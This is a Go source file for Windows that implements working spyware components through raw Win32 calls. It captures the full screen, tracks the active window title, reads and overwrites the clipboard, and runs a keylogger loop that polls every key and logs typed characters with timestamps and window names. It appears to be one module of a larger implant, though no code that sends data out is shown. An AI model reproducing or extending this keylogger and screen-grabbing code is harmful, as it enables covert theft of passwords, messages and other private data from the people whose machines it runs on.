//go:build windows
// +build windows

package main

import (
	"fmt"
	"image"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

func setDPIAware() {
	ret, _, _ := procSetProcessDpiAwareness.Call(uintptr(2))
	if ret != 0 {
		procSetProcessDPIAware.Call()
	}
	debugLog("DPI awareness set")
}

func getSystemMetrics(nIndex int32) int32 {
	ret, _, _ := procGetSystemMetrics.Call(uintptr(nIndex))
	return int32(ret)
}

func getDC(hwnd uintptr) uintptr {
	ret, _, _ := procGetDC.Call(hwnd)
	return ret
}

func releaseDC(hwnd, hdc uintptr) {
	procReleaseDC.Call(hwnd, hdc)
}

func getDeviceCaps(hdc uintptr, index int32) int32 {
	ret, _, _ := procGetDeviceCaps.Call(hdc, uintptr(index))
	return int32(ret)
}

func createCompatibleDC(hdc uintptr) uintptr {
	ret, _, _ := procCreateCompatibleDC.Call(hdc)
	return ret
}

func createCompatibleBitmap(hdc uintptr, w, h int32) uintptr {
	ret, _, _ := procCreateCompatibleBitmap.Call(hdc, uintptr(w), uintptr(h))
	return ret
}

func selectObject(hdc, obj uintptr) uintptr {
	ret, _, _ := procSelectObject.Call(hdc, obj)
	return ret
}

func bitBlt(hdcDest uintptr, x, y, w, h int32, hdcSrc uintptr, xSrc, ySrc int32, rop uint32) bool {
	ret, _, _ := procBitBlt.Call(
		hdcDest,
		uintptr(x), uintptr(y), uintptr(w), uintptr(h),
		hdcSrc,
		uintptr(xSrc), uintptr(ySrc),
		uintptr(rop),
	)
	return ret != 0
}

func getDIBits(hdc, hbmp uintptr, startScan, scanLines int32, bits unsafe.Pointer, bi *bitmapInfo, usage uint32) int32 {
	ret, _, _ := procGetDIBits.Call(
		hdc, hbmp,
		uintptr(startScan), uintptr(scanLines),
		uintptr(bits),
		uintptr(unsafe.Pointer(bi)),
		uintptr(usage),
	)
	return int32(ret)
}

func deleteDC(hdc uintptr) {
	procDeleteDC.Call(hdc)
}

func deleteObject(obj uintptr) {
	procDeleteObject.Call(obj)
}

func getVirtualScreen() (x, y, w, h int32) {
	x = getSystemMetrics(SM_XVIRTUALSCREEN)
	y = getSystemMetrics(SM_YVIRTUALSCREEN)
	w = getSystemMetrics(SM_CXVIRTUALSCREEN)
	h = getSystemMetrics(SM_CYVIRTUALSCREEN)
	if w <= 0 {
		w = getSystemMetrics(SM_CXSCREEN)
	}
	if h <= 0 {
		h = getSystemMetrics(SM_CYSCREEN)
	}
	return
}

func getActiveWindowTitle() string {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return ""
	}
	buf := make([]uint16, 512)
	n, _, _ := procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	if n == 0 {
		return ""
	}
	return syscall.UTF16ToString(buf[:n])
}

func captureScreenRGBA() (*image.RGBA, error) {
	setDPIAware()

	x, y, w, h := getVirtualScreen()
	if w <= 0 || h <= 0 {
		return nil, fmt.Errorf("invalid virtual screen dimensions: %dx%d", w, h)
	}

	debugLog(fmt.Sprintf("virtual screen raw: x=%d y=%d w=%d h=%d", x, y, w, h))

	hdc := getDC(0)
	if hdc == 0 {
		return nil, fmt.Errorf("GetDC failed")
	}
	defer releaseDC(0, hdc)

	dpiX := getDeviceCaps(hdc, LOGPIXELSX)
	debugLog(fmt.Sprintf("DPI: %d, using virtual screen %dx%d", dpiX, w, h))

	hdcMem := createCompatibleDC(hdc)
	if hdcMem == 0 {
		return nil, fmt.Errorf("CreateCompatibleDC failed")
	}
	defer deleteDC(hdcMem)

	hbm := createCompatibleBitmap(hdc, w, h)
	if hbm == 0 {
		return nil, fmt.Errorf("CreateCompatibleBitmap failed")
	}
	defer deleteObject(hbm)

	oldObj := selectObject(hdcMem, hbm)
	defer selectObject(hdcMem, oldObj)

	if !bitBlt(hdcMem, 0, 0, w, h, hdc, x, y, SRCCOPY|CAPTUREBLT) {
		bitBlt(hdcMem, 0, 0, w, h, hdc, x, y, SRCCOPY)
	}

	var bi bitmapInfo
	bi.bmiHeader.biSize = uint32(unsafe.Sizeof(bi.bmiHeader))
	bi.bmiHeader.biWidth = w
	bi.bmiHeader.biHeight = -h
	bi.bmiHeader.biPlanes = 1
	bi.bmiHeader.biBitCount = 32
	bi.bmiHeader.biCompression = BI_RGB

	pixBuf := make([]byte, int64(w)*int64(h)*4)

	lines := getDIBits(hdcMem, hbm, 0, h, unsafe.Pointer(&pixBuf[0]), &bi, DIB_RGB_COLORS)
	if lines <= 0 {
		return nil, fmt.Errorf("GetDIBits returned %d", lines)
	}

	for i := 0; i < len(pixBuf); i += 4 {
		pixBuf[i], pixBuf[i+2] = pixBuf[i+2], pixBuf[i]
		pixBuf[i+3] = 0xff
	}

	debugLog(fmt.Sprintf("screenshot captured %dx%d (%d bytes)", w, h, len(pixBuf)))

	return &image.RGBA{
		Pix:    pixBuf,
		Stride: int(w) * 4,
		Rect:   image.Rect(0, 0, int(w), int(h)),
	}, nil
}

var procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")

func getAsyncKeyState(vk int32) uint16 {
	ret, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
	return uint16(ret)
}

func vkToString(vk int, shift bool) string {
	switch vk {
	case 0x08:
		return "[Backspace]"
	case 0x09:
		return "[Tab]"
	case 0x0D:
		return "[Enter]\n"
	case 0x1B:
		return "[Esc]"
	case 0x20:
		return " "
	case 0x2E:
		return "[Del]"
	case 0x25:
		return "[Left]"
	case 0x26:
		return "[Up]"
	case 0x27:
		return "[Right]"
	case 0x28:
		return "[Down]"
	case 0x5B, 0x5C:
		return "[Win]"
	}

	if vk >= 0x41 && vk <= 0x5A {
		if shift {
			return string(rune(vk))
		}
		return string(rune(vk + 0x20))
	}

	if vk >= 0x30 && vk <= 0x39 {
		if shift {
			shiftMap := map[int]string{0x30: ")", 0x31: "!", 0x32: "@", 0x33: "#", 0x34: "$", 0x35: "%", 0x36: "^", 0x37: "&", 0x38: "*", 0x39: "("}
			if s, ok := shiftMap[vk]; ok {
				return s
			}
		}
		return string(rune(vk))
	}

	if shift {
		shiftPunct := map[int]string{
			0xBA: ":", 0xBB: "+", 0xBC: "<", 0xBD: "_", 0xBE: ">", 0xBF: "?",
			0xC0: "~", 0xDB: "{", 0xDC: "|", 0xDD: "}", 0xDE: "\"",
		}
		if s, ok := shiftPunct[vk]; ok {
			return s
		}
	} else {
		punct := map[int]string{
			0xBA: ";", 0xBB: "=", 0xBC: ",", 0xBD: "-", 0xBE: ".", 0xBF: "/",
			0xC0: "`", 0xDB: "[", 0xDC: "\\", 0xDD: "]", 0xDE: "'",
		}
		if s, ok := punct[vk]; ok {
			return s
		}
	}

	if vk >= 0x70 && vk <= 0x7B {
		return fmt.Sprintf("[F%d]", vk-0x6F)
	}

	return fmt.Sprintf("[0x%02X]", vk)
}

func keyloggerLoop() {
	debugLog("keylogger goroutine started")
	var prev [256]uint16
	lastWindow := ""
	for atomic.LoadInt32(&keylogActive) == 1 {
		currentWindow := getActiveWindowTitle()
		if currentWindow != lastWindow {
			keylogMu.Lock()
			keylogBuffer.WriteString(fmt.Sprintf("\n[%s] [%s]\n",
				time.Now().Format("2006-01-02 15:04:05"), currentWindow))
			keylogMu.Unlock()
			lastWindow = currentWindow
		}

		for vk := 0; vk < 256; vk++ {
			state := getAsyncKeyState(int32(vk))
			if (state&0x8000) != 0 && (prev[vk]&0x8000) == 0 {
				shift := (getAsyncKeyState(0x10) & 0x8000) != 0
				ch := vkToString(vk, shift)
				keylogMu.Lock()
				keylogBuffer.WriteString(ch)
				keylogMu.Unlock()
			}
			prev[vk] = state
		}
		time.Sleep(12 * time.Millisecond)
	}
	debugLog("keylogger goroutine stopped")
}

func clipboardGetWindows() (string, error) {
	ret, _, _ := procOpenClipboard.Call(0)
	if ret == 0 {
		return "", fmt.Errorf("open clipboard failed")
	}
	defer procCloseClipboard.Call()

	h, _, _ := procGetClipboardData.Call(CF_TEXT)
	if h == 0 {
		return "", fmt.Errorf("get clipboard data failed (maybe not text)")
	}

	ptr, _, _ := procGlobalLock.Call(h)
	if ptr == 0 {
		return "", fmt.Errorf("global lock failed")
	}
	defer procGlobalUnlock.Call(h)

	// Cast clipboard global memory handle to byte slice for CF_TEXT read.
	// Use the actual allocation size from GlobalSize — a fixed 1MB view would
	// read past the allocation into adjacent heap memory on smaller clips.
	size, _, _ := procGlobalSize.Call(h)
	if size == 0 {
		return "", fmt.Errorf("global size failed")
	}
	buf := (*[1 << 20]byte)(unsafe.Pointer(ptr))[:size]
	// CF_TEXT is NUL-terminated; return only up to the terminator. Returning
	// the whole buffer would also leak the uninitialized bytes that follow the
	// string within the allocation.
	n := size
	for i := uintptr(0); i < size; i++ {
		if buf[i] == 0 {
			n = i
			break
		}
	}
	return string(buf[:n]), nil
}

func clipboardSetWindows(data string) error {
	ret, _, _ := procOpenClipboard.Call(0)
	if ret == 0 {
		return fmt.Errorf("open clipboard failed")
	}
	defer procCloseClipboard.Call()

	procEmptyClipboard.Call()

	size := len(data) + 1
	hMem, _, _ := procGlobalAlloc.Call(GMEM_MOVEABLE, uintptr(size))
	if hMem == 0 {
		return fmt.Errorf("global alloc failed")
	}

	ptr, _, _ := procGlobalLock.Call(hMem)
	if ptr != 0 {
		// Size the destination view to the actual allocation, never a fixed
		// 1MB view that could extend past the Global's real bounds.
		allocSize, _, _ := procGlobalSize.Call(hMem)
		n := uintptr(len(data))
		if allocSize != 0 && allocSize < n {
			n = allocSize
		}
		copy((*[1 << 20]byte)(unsafe.Pointer(ptr))[:n], []byte(data))
		procGlobalUnlock.Call(hMem)
	}

	procSetClipboardData.Call(CF_TEXT, hMem)
	return nil
}
